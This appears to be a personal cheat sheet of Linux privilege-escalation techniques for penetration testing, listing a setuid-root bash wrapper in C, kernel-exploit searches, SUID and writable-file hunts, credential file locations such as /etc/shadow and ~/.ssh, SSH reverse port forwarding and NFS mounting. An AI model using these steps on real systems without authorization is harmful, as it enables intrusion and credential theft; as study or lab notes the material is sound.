# Privilege Escalation - Linux

## Custom shell executable
```
int main() {
	setuid(0);
	system("/bin/bash -p");
}

gcc -o <name> <filename.c>
```

## LSE - Linux Smart Enumeration
- https://github.com/diego-treitos/linux-smart-enumeration
- `l (0|1|2)`
  - increasingly more verbosity
```
./lse.sh -l 1
```

## Kernel Exploits
- `uname -a`
- `searchsploit linux kernel <version> priv sec`
- [Linux Exploit Suggester](https://github.com/jondonas/linux-exploit-suggester-2)
```
./linux-exploit-suggester-2.pl –k <version>
```

## Identify Services
```
ps aux | grep "^root"
rpm –qa | grep <program>
dpkg -l | grep <program>
netstat -nl
```

## Port Forwarding
```
ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
```

## Weak File Permissions
```
find /etc -maxdepth 1 -writable -type f
find /etc -maxdepth 1 -readable -type f
find / -executable -writable -type d 2> /dev/null
```
- /etc/passwd
- /etc/shadow

## Generate Password Hash
```
mkpasswd -m sha-512 newpassword
```

## Sudo
```
sudo <program>
sudo -u <username> <program>
sudo -l
sudo passwd
```

## Shell Escape Sequences
https://gtfobins.github.io/

## CRON
- _/var/spool/cron_
- _/var/spool/cron/crontabs/_
- systemwide crontab at _/etc/crontab_

## SUID Files
```
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;2> /dev/null
```

## Password and Key Files
- _~/.bash_history_
- _~/.ssh`_

## Backup Locations
- /var/backup

## NFS
```
showmount -e <target>
nmap –sV –script=nfs-showmount <target>
$ mount -o rw,vers=2 <target>:<share> <local_directory>
```
